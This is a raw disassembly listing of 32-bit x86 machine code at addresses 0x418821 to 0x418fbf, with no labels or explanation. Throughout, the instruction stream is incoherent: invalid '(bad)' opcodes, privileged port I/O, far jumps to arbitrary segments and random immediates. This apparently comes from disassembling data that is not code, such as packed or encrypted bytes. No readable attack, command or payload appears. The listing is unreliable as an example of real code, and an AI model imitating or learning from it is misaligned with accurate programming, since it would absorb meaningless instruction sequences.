  418821:	sbb    BYTE PTR [ecx],0xc2
  418824:	sar    DWORD PTR [eax-0x38bd89f6],1
  41882a:	jb     0x4187df
  41882c:	xchg   ebp,eax
  41882d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41882e:	and    DWORD PTR [ecx],eax
  418830:	push   cs
  418831:	pop    edi
  418832:	push   edi
  418833:	jne    0x4187e9
  418835:	cli    
  418836:	aaa    
  418837:	cld    
  418838:	xchg   edi,eax
  418839:	ins    BYTE PTR es:[edi],dx
  41883a:	push   eax
  41883b:	rcr    DWORD PTR [esi],1
  41883d:	loope  0x418835
  41883f:	in     al,dx
  418840:	dec    esp
  418841:	rcl    DWORD PTR [eax-0x3bc3e319],cl
  418847:	xor    BYTE PTR ds:0x700e7e6a,0xb5
  41884e:	inc    ecx
  41884f:	(bad)
  418852:	jmp    0x4983:0x98f77
  418859:	fwait
  41885a:	lods   eax,DWORD PTR cs:[esi]
  41885c:	push   edx
  41885d:	mov    dh,0xed
  41885f:	mov    ecx,0x99d1f7e4
  418864:	mov    eax,0xab0f49fe
  418869:	test   DWORD PTR [ebp-0x8],edi
  41886c:	fs jecxz 0x418870
  41886f:	fxch   st(1)
  418871:	mov    edx,0x609dfa91
  418876:	inc    esp
  418877:	inc    ecx
  418878:	mov    al,ds:0x5678a3cc
  41887d:	pop    esi
  41887e:	push   ss
  41887f:	xchg   bh,dl
  418881:	fdiv   QWORD PTR [edx+0x30]
  418884:	adc    al,ah
  418886:	push   0xe760256b
  41888b:	mov    BYTE PTR [ebx+0x46],dl
  41888e:	push   ds
  41888f:	mov    ebp,0x2209c4ba
  418894:	mov    cl,ch
  418896:	push   ebx
  418897:	xchg   dh,dl
  418899:	xchg   esi,eax
  41889a:	push   esi
  41889b:	mov    ebx,0x78c4f63d
  4188a0:	sbb    ecx,DWORD PTR [edx]
  4188a2:	mov    bl,0x20
  4188a4:	mov    ds,WORD PTR [edx]
  4188a6:	mov    cl,0x88
  4188a8:	mov    eax,0x20d1ba0b
  4188ad:	mov    ebp,0x22b84120
  4188b2:	pop    ds
  4188b3:	(bad)  
  4188b5:	nop
  4188b6:	ins    BYTE PTR es:[edi],dx
  4188b7:	adc    DWORD PTR [edx-0x608525e8],edx
  4188bd:	(bad)  
  4188be:	rcl    ecx,1
  4188c0:	or     DWORD PTR [ebx+ecx*1-0x13],esi
  4188c4:	sub    eax,0xedbf8713
  4188c9:	mov    bh,0x34
  4188cb:	mov    dh,0x27
  4188cd:	xchg   ecx,eax
  4188ce:	mov    eax,ds:0xe1e41e7b
  4188d3:	aam    0x53
  4188d5:	sub    eax,DWORD PTR ds:0xbd39b0f4
  4188db:	sbb    edx,0x23
  4188de:	sub    esp,DWORD PTR [ebp+0x6fd4b16b]
  4188e4:	add    edi,DWORD PTR gs:[edx-0x3a]
  4188e8:	pop    edi
  4188e9:	addr16 repz cmp cl,al
  4188ed:	cld    
  4188ee:	in     al,0x55
  4188f0:	in     al,0x76
  4188f2:	js     0x41890c
  4188f4:	xor    ah,dh
  4188f6:	test   eax,0x5631bade
  4188fb:	rol    dh,1
  4188fd:	dec    eax
  4188fe:	idiv   dh
  418900:	fisub  DWORD PTR [edi+0x9ebceff]
  418906:	scas   al,BYTE PTR es:[edi]
  418907:	jmp    0x6195838
  41890c:	es fs into 
  41890f:	mov    eax,0x1ea2a1d6
  418914:	leave  
  418915:	aam    0xe9
  418917:	sbb    dh,cl
  418919:	(bad)  
  41891a:	in     eax,dx
  41891b:	ins    DWORD PTR es:[edi],dx
  41891c:	adc    DWORD PTR [edi-0x26],eax
  41891f:	pop    ebp
  418920:	fs push eax
  418922:	cmp    al,0xe9
  418924:	adc    DWORD PTR [edi+0x5b],edi
  418927:	test   al,0xf9
  418929:	xchg   ebx,eax
  41892a:	(bad)  
  41892c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41892e:	xchg   ebx,eax
  41892f:	jne    0x41897f
  418931:	in     eax,dx
  418932:	test   DWORD PTR [ecx-0x4d],eax
  418935:	sub    al,0x91
  418937:	std    
  418938:	sbb    DWORD PTR [eax],esp
  41893a:	xchg   bl,dh
  41893c:	xchg   edx,eax
  41893d:	in     al,dx
  41893e:	jmp    0x2f36:0xf77cb30c
  418945:	adc    eax,0x47c8e871
  41894a:	nop
  41894b:	data16 (bad) 
  41894d:	pop    ds
  41894e:	add    eax,0x781d770e
  418953:	stos   BYTE PTR es:[edi],al
  418954:	ds call 0x9849:0xb012ce8f
  41895c:	sub    edi,eax
  41895e:	jle    0x418920
  418960:	jmp    0x9d66:0x52737f57
  418967:	das    
  418968:	sub    BYTE PTR [edi],dl
  41896a:	cmp    BYTE PTR [esi],ch
  41896c:	scas   eax,DWORD PTR es:[edi]
  41896d:	push   ebx
  41896e:	sbb    BYTE PTR ds:0x13fef34c,cl
  418974:	(bad)
  418977:	push   esp
  418978:	adc    al,0x61
  41897a:	add    DWORD PTR [ebx+0x5a330b60],edi
  418980:	mov    DWORD PTR [ebx-0x7d08614b],edx
  418986:	dec    edx
  418987:	sbb    DWORD PTR ds:0xe9b5fbf5,ebx
  41898d:	aas    
  41898e:	shl    DWORD PTR [ebx],cl
  418990:	push   es
  418991:	sub    esi,esi
  418993:	out    dx,al
  418994:	mov    ebp,0x636b5c6d
  418999:	dec    ecx
  41899a:	sub    edx,DWORD PTR [eax]
  41899c:	mov    edx,0x3f00e745
  4189a1:	lods   al,BYTE PTR ds:[esi]
  4189a2:	pop    es
  4189a3:	cs mov bh,0x24
  4189a6:	cli    
  4189a7:	mov    ds:0xad42fea3,eax
  4189ac:	ds fucompp 
  4189af:	out    dx,al
  4189b0:	xchg   esp,eax
  4189b1:	clc    
  4189b2:	enter  0x4188,0x46
  4189b6:	cmp    dh,BYTE PTR [esi-0x7e]
  4189b9:	outs   dx,DWORD PTR ds:[esi]
  4189ba:	mov    cl,0x80
  4189bc:	dec    ebx
  4189bd:	(bad)  
  4189be:	mov    eax,0x7572cc03
  4189c3:	mov    ah,0x14
  4189c5:	fstp   QWORD PTR [ecx+0x1a]
  4189c8:	test   BYTE PTR [edx+0x12],ah
  4189cb:	push   ebx
  4189cc:	sbb    ah,0xa7
  4189cf:	xchg   ecx,eax
  4189d0:	dec    ebp
  4189d1:	das    
  4189d2:	sahf   
  4189d3:	nop
  4189d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189d5:	stos   DWORD PTR es:[edi],eax
  4189d6:	aas    
  4189d7:	and    ecx,DWORD PTR [edi-0x8cb1f54]
  4189dd:	cs daa 
  4189df:	repnz sub dl,cl
  4189e2:	mov    bh,0xa0
  4189e4:	cs mov dl,0xec
  4189e7:	jmp    0x1bbf:0x188f0f83
  4189ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189ef:	scas   al,BYTE PTR es:[edi]
  4189f0:	stos   BYTE PTR es:[edi],al
  4189f1:	sahf   
  4189f2:	mov    ds:0xa8ff364a,eax
  4189f7:	aaa    
  4189f8:	jbe    0x41898d
  4189fa:	scas   eax,DWORD PTR es:[edi]
  4189fb:	adc    eax,DWORD PTR [ebx]
  4189fd:	mov    al,ds:0xe2d5978d
  418a02:	ror    BYTE PTR [ebx-0x31f47218],1
  418a08:	cld    
  418a09:	lods   al,BYTE PTR ds:[esi]
  418a0a:	je     0x418a88
  418a0c:	or     DWORD PTR [ebp-0x953bdd0],ebx
  418a12:	push   ebp
  418a13:	in     al,0x4
  418a15:	out    dx,eax
  418a16:	mov    ah,dh
  418a18:	pop    esp
  418a19:	xor    al,0x96
  418a1b:	in     eax,0xbf
  418a1d:	xlat   BYTE PTR ds:[ebx]
  418a1e:	cwde   
  418a1f:	mov    eax,DWORD PTR cs:[ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	pop    ebx
  418a3f:	into   
  418a40:	in     al,0xd6
  418a42:	cmp    DWORD PTR [edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	sub    dh,BYTE PTR [edi-0x3db163b5]
  418a50:	stc    
  418a51:	(bad)  
  418a53:	popa   
  418a54:	bound  ebx,QWORD PTR [edi]
  418a56:	mov    dh,0xa2
  418a58:	dec    ebx
  418a59:	mov    WORD PTR [esi-0x562a779],fs
  418a5f:	imul   edx,DWORD PTR [eax+0x2a],0x64cdb729
  418a66:	mov    bh,0xd8
  418a68:	hlt    
  418a69:	fld    QWORD PTR [edi+eax*8]
  418a6c:	jne    0x418ace
  418a6e:	inc    esi
  418a6f:	inc    eax
  418a70:	fimul  WORD PTR [edx-0x43]
  418a73:	dec    esp
  418a74:	sbb    eax,0xa46f9c91
  418a79:	rcr    BYTE PTR [eax],cl
  418a7b:	call   0xb84a:0x47fced
  418a82:	call   0xe77:0x1e65113c
  418a89:	adc    al,0x37
  418a8b:	outs   dx,BYTE PTR ds:[esi]
  418a8c:	psllq  mm2,mm3
  418a8f:	out    dx,eax
  418a90:	pushf  
  418a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a92:	mov    sp,0x1372
  418a96:	ret    0x29f2
  418a99:	iret   
  418a9a:	sub    ebp,0xbc748e3c
  418aa0:	push   ecx
  418aa1:	hlt    
  418aa2:	das    
  418aa3:	xchg   DWORD PTR gs:[eax-0x7c],ecx
  418aa7:	dec    ebp
  418aa8:	mov    eax,0x7db36ea3
  418aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aae:	xchg   esi,eax
  418aaf:	outs   dx,BYTE PTR ds:[esi]
  418ab0:	mov    edi,0x6354f055
  418ab5:	mov    ds:0xbb04492b,eax
  418aba:	sub    al,BYTE PTR [ecx]
  418abc:	push   esi
  418abd:	and    cl,dl
  418abf:	fsubr  st(4),st
  418ac1:	xor    al,0x64
  418ac3:	or     ebx,eax
  418ac5:	push   edx
  418ac6:	sub    esi,ebp
  418ac8:	rcr    BYTE PTR [edx+0x740dd6e5],0xb5
  418acf:	cmp    al,0xe7
  418ad2:	mov    ds:0x62e14396,eax
  418ad7:	iret   
  418ad8:	jp     0x418b55
  418ada:	fisubr WORD PTR [edx+eiz*8-0x5cf55ca8]
  418ae1:	jb     0x418aac
  418ae3:	mov    DWORD PTR [esp+edi*4],ebx
  418ae6:	jle    0x418b42
  418ae8:	pop    edx
  418ae9:	(bad)  
  418aea:	cld    
  418aeb:	mov    dl,0x7a
  418aed:	shl    BYTE PTR [ecx],0x9c
  418af0:	jge    0x418b18
  418af2:	or     BYTE PTR [ebx],dh
  418af4:	mov    eax,DWORD PTR [ecx]
  418af6:	jb     0x418a8f
  418af8:	cwde   
  418af9:	fwait
  418afa:	jnp    0x418b46
  418afc:	aad    0x34
  418afe:	retf   
  418aff:	pop    DWORD PTR [ecx+0x4e]
  418b02:	shl    bh,cl
  418b04:	push   ebp
  418b05:	add    al,0x9b
  418b07:	mov    ds:0xe65690cc,al
  418b0c:	lea    edi,[ecx]
  418b0e:	fisubr WORD PTR [esi]
  418b10:	test   BYTE PTR ds:[ecx+ebx*8-0x35318678],0x9e
  418b19:	mov    esi,0xe35db6e
  418b1e:	call   0x5851:0xb1e077bf
  418b25:	sbb    eax,0x9a9ac8e8
  418b2a:	mov    eax,ds:0x1f20a07b
  418b2f:	jecxz  0x418b59
  418b31:	jno    0x418b38
  418b33:	outs   dx,BYTE PTR ds:[esi]
  418b34:	fdivp  st(4),st
  418b36:	ins    BYTE PTR es:[edi],dx
  418b37:	enter  0x6e0e,0x81
  418b3b:	(bad)  
  418b3c:	sahf   
  418b3d:	mov    dl,0xd5
  418b3f:	or     al,0x29
  418b41:	in     al,0x8d
  418b43:	ins    DWORD PTR es:[edi],dx
  418b44:	call   0x4ee4:0xa704706f
  418b4b:	cs inc eax
  418b4d:	in     al,dx
  418b4e:	mov    dl,0xa1
  418b50:	pop    ebp
  418b51:	call   0x99ddaed5
  418b56:	sbb    DWORD PTR [esi],esi
  418b58:	mov    esp,0x1e702781
  418b5d:	mov    al,0xe7
  418b5f:	outs   dx,DWORD PTR ds:[esi]
  418b60:	imul   ebp,DWORD PTR [eax+0x17],0xffffff8c
  418b64:	test   BYTE PTR [ebx],0x76
  418b67:	sar    DWORD PTR [esi],1
  418b69:	and    cl,BYTE PTR [edi-0x6c]
  418b6c:	push   ecx
  418b6d:	push   ds
  418b6e:	fsubr  QWORD PTR ss:[esp+eax*8]
  418b72:	sbb    eax,0xc780c2f4
  418b77:	pop    ebp
  418b78:	sahf   
  418b79:	mov    ds:0x71d1344e,eax
  418b7e:	push   gs
  418b80:	enter  0x8970,0x71
  418b84:	aas    
  418b85:	sbb    eax,0xb99e3ee
  418b8a:	jge    0x418bdf
  418b8c:	jle    0x418b28
  418b8e:	test   eax,0xb2b84c36
  418b93:	xor    al,0x21
  418b95:	sub    BYTE PTR es:[edi+eiz*8-0x7bd5cac1],dl
  418b9d:	int3   
  418b9e:	mov    es,WORD PTR [ebx]
  418ba0:	dec    ebx
  418ba1:	std    
  418ba2:	out    dx,al
  418ba3:	int3   
  418ba4:	sub    al,0x1b
  418ba6:	ins    DWORD PTR es:[edi],dx
  418ba7:	mov    bh,0xf2
  418ba9:	cwde   
  418baa:	cld    
  418bab:	and    ecx,DWORD PTR [ebp+0x5d]
  418bae:	sub    al,0xbc
  418bb0:	test   eax,esi
  418bb2:	loope  0x418be2
  418bb4:	xor    ah,BYTE PTR [ebp-0x3463af53]
  418bba:	or     ebx,DWORD PTR [esi+0x41]
  418bbd:	ss js  0x418bea
  418bc0:	adc    ch,cl
  418bc2:	shl    edx,1
  418bc4:	stc    
  418bc5:	lods   al,BYTE PTR ds:[esi]
  418bc6:	arpl   WORD PTR ds:0xa962fd47,di
  418bcc:	or     DWORD PTR [ebp-0x32f96e73],0x17be8e39
  418bd6:	sub    dl,BYTE PTR [ebx+0x16]
  418bd9:	aam    0x4f
  418bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bdc:	cmp    eax,0x7bdfe7e2
  418be1:	les    edi,FWORD PTR [edi-0xc7c0b6f]
  418be7:	fistp  QWORD PTR [edi]
  418be9:	mov    ch,dh
  418beb:	popa   
  418bec:	pop    eax
  418bed:	outs   dx,BYTE PTR ds:[esi]
  418bee:	out    dx,al
  418bef:	pop    ss
  418bf0:	sub    cl,al
  418bf2:	push   ss
  418bf3:	inc    ebx
  418bf4:	call   0x86699c65
  418bf9:	shl    DWORD PTR [ebx+0x62213617],0x85
  418c00:	xchg   edx,eax
  418c01:	or     ah,ah
  418c03:	add    al,0x10
  418c05:	add    cl,BYTE PTR [edx+0x19]
  418c08:	push   esp
  418c09:	or     ch,BYTE PTR [eax]
  418c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c0c:	stc    
  418c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c0e:	cmp    ch,BYTE PTR [ebx+0x78d148b3]
  418c14:	in     al,0xa8
  418c16:	out    dx,al
  418c17:	mov    eax,0x8b507912
  418c1c:	jb     0x418c35
  418c1e:	aas    
  418c1f:	sub    al,bh
  418c21:	or     bh,BYTE PTR es:[eax-0x3e]
  418c25:	and    eax,0xa5b5a9b7
  418c2a:	fidiv  DWORD PTR [esi-0x65]
  418c2d:	and    cl,BYTE PTR [edx]
  418c2f:	mov    cl,0xf0
  418c31:	cli    
  418c32:	inc    esp
  418c33:	sbb    al,BYTE PTR [ecx+edi*4+0x63]
  418c37:	push   esp
  418c38:	sub    DWORD PTR [esi],edx
  418c3a:	lahf   
  418c3b:	cmp    esi,ebx
  418c3d:	xchg   ecx,eax
  418c3e:	pop    ss
  418c3f:	and    bl,dh
  418c41:	jb     0x418c40
  418c43:	mov    al,0x5e
  418c45:	push   edi
  418c46:	call   0x51fd164e
  418c4b:	dec    ebp
  418c4c:	and    BYTE PTR [esi+0x26],al
  418c4f:	sbb    esi,DWORD PTR [edx]
  418c51:	popf   
  418c52:	pop    ebx
  418c53:	cli    
  418c54:	dec    eax
  418c55:	(bad)  
  418c56:	in     eax,dx
  418c57:	mov    DWORD PTR [ecx],edx
  418c59:	repz or BYTE PTR ds:0x8fd98deb,al
  418c60:	lods   eax,DWORD PTR ds:[esi]
  418c61:	cld    
  418c62:	xlat   BYTE PTR ds:[ebx]
  418c63:	mov    WORD PTR [edi-0x57],cs
  418c66:	inc    esi
  418c67:	pop    ecx
  418c68:	test   eax,0xf1d82882
  418c6d:	fiadd  DWORD PTR [esi-0x53af0bc1]
  418c73:	mov    ds,WORD PTR [esi-0x28cc6519]
  418c79:	mov    esp,0x21627263
  418c7e:	add    eax,0x79b70c1
  418c83:	(bad)  
  418c84:	jle    0x418c23
  418c86:	pop    esi
  418c87:	inc    ecx
  418c88:	stos   DWORD PTR es:[edi],eax
  418c89:	call   0x3f3bc337
  418c8e:	push   esi
  418c8f:	pop    edi
  418c90:	mov    dl,0x45
  418c92:	je     0x418c59
  418c94:	nop
  418c95:	aas    
  418c96:	dec    esi
  418c97:	adc    BYTE PTR [edi+0x4a3fc0f],dh
  418c9d:	and    eax,0x175062d9
  418ca2:	mul    edx
  418ca4:	sbb    eax,edx
  418ca6:	adc    BYTE PTR [eax-0xaaaa33],ch
  418cac:	jne    0x418c57
  418cae:	and    ebx,DWORD PTR [esi]
  418cb0:	adc    al,0xd4
  418cb2:	adc    al,0xb9
  418cb4:	aam    0xea
  418cb6:	sub    DWORD PTR [ebp+0xa],ecx
  418cb9:	inc    ebx
  418cba:	mov    ch,0x98
  418cbc:	xchg   edi,eax
  418cbd:	push   ds
  418cbe:	pushf  
  418cbf:	dec    BYTE PTR [ecx]
  418cc1:	jl     0x418d23
  418cc3:	and    BYTE PTR [edx-0x2b68ccc6],dh
  418cc9:	test   al,0x1d
  418ccb:	sub    eax,0xed2196ec
  418cd1:	jecxz  0x418d41
  418cd3:	lods   al,BYTE PTR ds:[esi]
  418cd4:	push   ecx
  418cd5:	xor    al,0x46
  418cd7:	pop    esp
  418cd8:	or     al,0x9e
  418cda:	loop   0x418c90
  418cdc:	mov    ch,ch
  418cde:	not    BYTE PTR [ebx-0x548a054a]
  418ce4:	aad    0x23
  418ce6:	stos   DWORD PTR es:[edi],eax
  418ce7:	cmp    ah,bh
  418ce9:	sar    BYTE PTR [eax],0x17
  418cec:	es mov al,0xb2
  418cef:	test   al,0xd9
  418cf1:	jb     0x418cf4
  418cf3:	aaa    
  418cf4:	mov    ah,0x66
  418cf6:	test   DWORD PTR ds:0x3e0824c8,edi
  418cfc:	retf   0x6d57
  418cff:	pop    ecx
  418d00:	fs inc ecx
  418d02:	jp     0x418d4b
  418d04:	or     dl,BYTE PTR [ebx]
  418d06:	mov    ds:0x9ce4d164,al
  418d0b:	imul   eax,DWORD PTR [edi],0xffffffc8
  418d0e:	shr    DWORD PTR [esi+0x7d2e306e],1
  418d14:	inc    esp
  418d15:	imul   ebp,DWORD PTR [ebx+0x1061919c],0xc62b5947
  418d1f:	sbb    eax,ebp
  418d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d22:	rol    BYTE PTR [ecx*1+0x78fae0b9],0xdd
  418d2a:	dec    eax
  418d2b:	shl    DWORD PTR [ecx],1
  418d2d:	imul   BYTE PTR [esi-0x43207c54]
  418d33:	cmp    al,0x7d
  418d35:	imul   esi,esi,0xfa03ec06
  418d3b:	mov    ebx,0xf289112f
  418d40:	add    DWORD PTR [ebx+0x42],0x2c5abab9
  418d47:	lea    edx,[edx+0x2e28cd3b]
  418d4d:	mov    ds:0x4c03a4f2,al
  418d52:	push   esp
  418d53:	test   eax,0x2b955f5a
  418d58:	imul   edx,DWORD PTR [ebx+0x3232a393],0x23
  418d5f:	test   al,0x81
  418d61:	mov    ds:0xd85a710a,eax
  418d66:	call   0x56fb53ea
  418d6b:	out    0x10,eax
  418d6d:	xchg   BYTE PTR [esi],dh
  418d6f:	jmp    0x418d52
  418d71:	cmp    al,0x31
  418d73:	pop    ss
  418d74:	add    al,0xcc
  418d76:	sub    al,0xb6
  418d78:	or     al,0xd6
  418d7a:	shr    ah,0x91
  418d7d:	aas    
  418d7e:	stos   BYTE PTR es:[edi],al
  418d7f:	cmp    BYTE PTR [ebx+0x48],bl
  418d82:	and    BYTE PTR [ecx-0x3641bd84],dl
  418d88:	inc    ebx
  418d89:	or     BYTE PTR [eax+0x6e],0xc
  418d8d:	inc    eax
  418d8e:	sahf   
  418d8f:	push   eax
  418d90:	inc    ecx
  418d91:	cmp    BYTE PTR [edi+0x11],0xb6
  418d95:	scas   al,BYTE PTR es:[edi]
  418d96:	mov    ds:0x560f9405,eax
  418d9b:	jmp    0x89c5f9a5
  418da0:	or     DWORD PTR [esi+0x580b3583],edx
  418da6:	adc    dh,BYTE PTR [edi]
  418da8:	and    eax,0x45576960
  418dad:	je     0x418d48
  418daf:	ds sahf 
  418db1:	cld    
  418db2:	out    0x45,al
  418db4:	sub    al,0xe2
  418db6:	adc    al,0x35
  418db8:	ja     0x418e38
  418dba:	inc    esi
  418dbb:	ret    0x1cfe
  418dbe:	fisubr WORD PTR ds:0x4bce1d7d
  418dc4:	add    eax,0x4ff816f2
  418dc9:	sbb    al,0x90
  418dcb:	sbb    eax,0xe3cd0222
  418dd0:	fdivr  QWORD PTR [edi+0x21bb83f0]
  418dd6:	cmp    DWORD PTR [eax],esi
  418dd8:	push   eax
  418dd9:	mov    WORD PTR [esi],gs
  418ddb:	hlt    
  418ddc:	loope  0x418d6e
  418dde:	aad    0xc8
  418de0:	nop
  418de1:	sbb    BYTE PTR [eax],al
  418de3:	(bad)  
  418de4:	pushf  
  418de5:	outs   dx,DWORD PTR ds:[esi]
  418de6:	adc    dl,BYTE PTR [esi-0x1e]
  418de9:	ins    BYTE PTR es:[edi],dx
  418dea:	ret    
  418deb:	aad    0x66
  418ded:	loop   0x418dab
  418def:	pop    edx
  418df0:	aad    0x5
  418df2:	adc    ah,BYTE PTR [ecx+0x50599c23]
  418df8:	and    edx,edi
  418dfa:	int3   
  418dfb:	mov    ds:0xab45322b,al
  418e00:	jg     0x418ddd
  418e02:	jne    0x418e0a
  418e04:	jecxz  0x418e38
  418e06:	(bad)  ds:0xee948abd
  418e0c:	cmp    DWORD PTR [ecx-0x51],0x16
  418e10:	stos   BYTE PTR es:[edi],al
  418e11:	xor    ebp,edx
  418e13:	push   ds
  418e14:	push   ebp
  418e15:	cmp    eax,0xf63a7998
  418e1a:	(bad)  
  418e1b:	pusha  
  418e1c:	mov    edi,0xca1e33b
  418e21:	pop    ebp
  418e22:	iret   
  418e23:	gs cdq 
  418e25:	xchg   esp,eax
  418e26:	lods   eax,DWORD PTR ds:[esi]
  418e27:	sub    al,0x5d
  418e29:	xchg   edx,eax
  418e2a:	push   cs
  418e2b:	push   es
  418e2c:	aam    0xce
  418e2e:	sbb    al,BYTE PTR [esi]
  418e30:	cmp    edi,DWORD PTR [esi+0x55]
  418e33:	sbb    dh,bl
  418e35:	mov    ebx,0x78110a0d
  418e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e3b:	xchg   esi,eax
  418e3c:	inc    ecx
  418e3d:	fadd   DWORD PTR [ebp+ebp*2+0x46]
  418e41:	pop    esp
  418e42:	ret    0xa5d
  418e45:	pop    esp
  418e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e47:	mov    ch,0xbd
  418e49:	sub    edi,DWORD PTR [ebx+0x1c]
  418e4c:	scas   eax,DWORD PTR es:[edi]
  418e4d:	(bad)  
  418e4e:	loop   0x418e64
  418e50:	push   eax
  418e51:	inc    edi
  418e52:	ja     0x418de4
  418e54:	cmp    al,0xc9
  418e56:	outs   dx,DWORD PTR ds:[esi]
  418e57:	dec    edx
  418e58:	sbb    esi,DWORD PTR [edi]
  418e5a:	in     al,0x7b
  418e5c:	pop    ds
  418e5d:	adc    al,0xcf
  418e5f:	and    DWORD PTR [esi+0x2f3829ff],0x23e8bf5b
  418e69:	cmp    eax,edi
  418e6b:	push   ds
  418e6c:	imul   ebx,ebp,0x522254ee
  418e72:	lock jb 0x418e7d
  418e75:	xchg   esp,eax
  418e76:	test   BYTE PTR [ebx-0x37],dh
  418e79:	es push esi
  418e7b:	push   0x52
  418e7d:	mov    cl,0x90
  418e7f:	std    
  418e80:	mov    dh,0x96
  418e82:	mov    eax,ds:0x75d38f31
  418e87:	in     al,0xbe
  418e89:	xor    al,0xc3
  418e8b:	icebp  
  418e8c:	xor    DWORD PTR [ecx+0x3f9c7762],esi
  418e92:	or     bh,ch
  418e94:	fmul   QWORD PTR [ecx+esi*2+0x35726bdc]
  418e9b:	inc    ebx
  418e9c:	in     al,0xc7
  418e9e:	or     al,0x42
  418ea0:	adc    al,0x55
  418ea2:	icebp  
  418ea3:	adc    al,0xd9
  418ea5:	js     0x418eb9
  418ea7:	sub    eax,0x2b4ef20
  418eac:	hlt    
  418ead:	mov    ds:0xda8f1586,eax
  418eb2:	das    
  418eb3:	js     0x418f29
  418eb5:	push   es
  418eb6:	push   ecx
  418eb7:	mov    ds:0x25e0fde2,eax
  418ebc:	mov    ecx,0x3242ccf2
  418ec1:	stc    
  418ec2:	sbb    BYTE PTR [edx-0x49],ch
  418ec5:	imul   DWORD PTR [ebx]
  418ec7:	mov    cl,0x2b
  418ec9:	xchg   edi,eax
  418eca:	inc    esp
  418ecb:	and    eax,0xd7727b39
  418ed0:	in     eax,dx
  418ed1:	bound  ebx,QWORD PTR [ecx-0x7bd4586e]
  418ed7:	das    
  418ed8:	je     0x418f4c
  418eda:	mov    WORD PTR [edi+0x51],cs
  418edd:	jbe    0x418f34
  418edf:	dec    ebx
  418ee0:	lds    edx,FWORD PTR [edi+0x7d46a95f]
  418ee6:	cmp    eax,edi
  418ee8:	inc    ecx
  418ee9:	cmc    
  418eea:	in     al,dx
  418eeb:	call   0x5fc38122
  418ef0:	push   edi
  418ef1:	cli    
  418ef2:	rcl    BYTE PTR [edi+eax*2-0x69],1
  418ef6:	xchg   ebx,eax
  418ef7:	push   ecx
  418ef8:	(bad)  
  418ef9:	sbb    al,0x50
  418efb:	repz pop edi
  418efd:	sbb    esi,DWORD PTR [ecx-0x46]
  418f00:	je     0x418f51
  418f02:	ins    DWORD PTR es:[edi],dx
  418f03:	pop    ebp
  418f04:	rol    DWORD PTR [edx-0x37],1
  418f07:	sub    cl,dh
  418f09:	aaa    
  418f0a:	popf   
  418f0b:	jmp    0xd759c317
  418f10:	mov    ecx,DWORD PTR [ebx+ebx*2]
  418f13:	cs dec edi
  418f15:	jecxz  0x418f38
  418f17:	inc    ecx
  418f18:	push   es
  418f19:	mov    ebx,0x8b1d5362
  418f1e:	mov    ecx,ebp
  418f20:	pop    ebx
  418f21:	je     0x418f2d
  418f23:	arpl   WORD PTR [ecx-0x1d],bp
  418f26:	inc    esp
  418f27:	or     edx,ebx
  418f29:	pop    ss
  418f2a:	int3   
  418f2b:	(bad)  
  418f2c:	ja     0x418f33
  418f2e:	or     cl,BYTE PTR [eax+ebp*1-0x584c7003]
  418f35:	pop    es
  418f36:	xchg   DWORD PTR [ebx-0x3a],esp
  418f39:	test   edx,esi
  418f3b:	iret   
  418f3c:	sub    eax,0x49f9cf39
  418f41:	push   ecx
  418f42:	pop    esi
  418f43:	xor    DWORD PTR [ebx+0x5b],ebx
  418f46:	jno    0x418eca
  418f48:	or     esi,ecx
  418f4a:	cmp    eax,0x5bafad1d
  418f4f:	ret    
  418f50:	(bad)  
  418f51:	adc    eax,0x10e2395d
  418f56:	imul   edi,DWORD PTR [ebp-0x38],0x1
  418f5a:	pop    esi
  418f5b:	lods   eax,DWORD PTR ds:[esi]
  418f5c:	sbb    BYTE PTR [ecx-0x1ff55b25],dl
  418f62:	pop    ebx
  418f63:	mov    cl,0xfa
  418f65:	dec    esi
  418f66:	pop    edi
  418f67:	inc    eax
  418f68:	mov    bl,0x7
  418f6a:	ja     0x418f5c
  418f6c:	xchg   ecx,eax
  418f6d:	enter  0x39be,0xab
  418f71:	lods   al,BYTE PTR ds:[esi]
  418f72:	xchg   edi,eax
  418f73:	bndstx [edi-0x75],(bad)
  418f77:	dec    eax
  418f78:	jecxz  0x418f07
  418f7a:	fiadd  WORD PTR [edi+0x416edf55]
  418f80:	arpl   WORD PTR [ecx+edi*1-0x2a4d590d],bx
  418f87:	mov    esi,0x3f158aa5
  418f8c:	dec    ebx
  418f8d:	cmp    DWORD PTR [edx-0x1dc85826],ebp
  418f93:	stos   BYTE PTR es:[edi],al
  418f94:	xchg   esi,eax
  418f95:	and    ch,BYTE PTR [ecx]
  418f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f98:	jbe    0x418fee
  418f9a:	xor    DWORD PTR [eax+ebp*2+0x27],esp
  418f9e:	scas   eax,DWORD PTR es:[edi]
  418f9f:	into   
  418fa0:	push   edx
  418fa1:	aaa    
  418fa2:	pop    ebp
  418fa3:	lods   al,BYTE PTR ds:[esi]
  418fa4:	ds inc ecx
  418fa6:	sti    
  418fa7:	push   esi
  418fa8:	xchg   ebx,eax
  418fa9:	xchg   ecx,eax
  418faa:	dec    ebp
  418fab:	mov    ds:0x5a6ee4b0,al
  418fb0:	pop    esp
  418fb1:	adc    esp,esi
  418fb3:	stos   DWORD PTR es:[edi],eax
  418fb4:	xor    DWORD PTR [ebp-0x26],esp
  418fb7:	das    
  418fb8:	stos   BYTE PTR es:[edi],al
  418fb9:	mov    edx,0x71170c34
  418fbf:	jle    0x41901c
